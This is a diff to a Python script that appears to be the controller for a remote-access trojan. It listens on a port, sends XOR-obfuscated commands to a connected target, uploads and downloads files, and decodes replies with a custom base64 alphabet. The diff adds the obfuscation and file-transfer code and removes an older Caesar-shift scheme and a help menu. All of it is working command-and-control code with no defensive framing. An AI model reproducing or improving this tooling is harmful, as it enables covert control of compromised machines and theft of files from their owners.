@@ -7,7 +7,6 @@ HOST = '0.0.0.0'
 PORT = 1234
 
 def customb64(xored):
-    print("which is: " + xored)
     cust = "uLoqK3h57MieJNUPzmdG1A9DCZBtjwlOVWaYTcx2pI/g0rb+4SfE6nFRHvyXkQs8"
     b64 =  "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
 
@@ -15,37 +14,16 @@ def customb64(xored):
     result = xored.translate(new64)
 
     result += '='
-    return base64.decodestring(result)
+    return base64.b64decode(result).decode()
     
 
 def xor(command):
     # xor part
-    xored = ''
-    # print("Command: " + command.decode('utf-8'))
-    for char in command:
-        print(char)
-        xored += chr(ord(char) ^ 0x89)
-        print(xored)
-    xored += chr(0)
+    xored = b''
+    command = command.encode('utf-8')
+    for byte in command:
+        xored += bytes([byte ^ 0x89])
     return xored
-
-# Text: command
-# s: shift 
-def encrypt(text, s):
-    result = ""
-    # transverse the plain text
-    for i in range(len(text)):
-        char = text[i]
-        # Encrypt uppercase characters in plain text
-        
-        if (char.isupper()):
-            result += chr((ord(char) + s-65) % 26 + 65)
-        # Encrypt lowercase characters in plain text
-        else:
-            result += chr((ord(char) + s - 97) % 26 + 97)
-
-        # print("Inside cipher: "  + )
-    return result
 
 def main():
     # Start listening
@@ -58,45 +36,39 @@ def main():
     ci = 4
 
     while(True):
+        boolean = True
         command = input("476-1337 >>> ")
         if command == "exit":
             print("Peace out bro....")
             s.close()
             exit()
-        elif command == "help":
-            print('''Here are the available commands: \ninfo: Get general information about the target \nlp: List all running process \nupload <source> <destination>: source is u, destination is where you wanna save it \ndownload <filename>: filename should be the absolute path''')
-        elif command == "info":
-            print("Getting info from target")
-            result = encrypt(command, ci)
-            print(result)
-            conn.send(result.encode())
-        elif command == "upload":
+        elif "upload" in command:
+            result = xor(command)
+            conn.send(result)
             # Ask for source and destination from here
             print("Upload your file")
             file = input("What file do you want to upload: ")
             filecon = open(file, "r")
-            line = filecon.readlines()
-            for i in line:
-                conn.send((encrypt(i, ci).encode()))
+            bytez = filecon.read()
+            conn.send(xor(bytez))
+            boolean = False
         elif command == "download":
+            result = xor(command)
+            conn.send(result)
             # Get the file name from here
             print("Downloading file to current directory")
             file = input("What file do you want to download: ")
-            result = encrypt(file, ci)
-            print(result)
-            # conn.send(result.encode())
-        elif command == "lp":
-            print("Listing process....")
-            result = encrypt(command, ci)
-            print(result)
-            conn.send(result.encode())
+            result = xor(file)
+            conn.send(result)
         else:
-            result = encrypt(command, ci)
-            print(result)
-            conn.send(result.encode())
+            result = xor(command)
+            conn.send(result)
 
-        # reply = conn.recv(4096)
-        # print("Result:\n " + reply)
+        if boolean:
+            reply = conn.recv(100000)
+            print("Result:\n ")
+            print(reply.decode())
+            print(customb64(reply.decode()))
 
 
 if __name__ == "__main__":
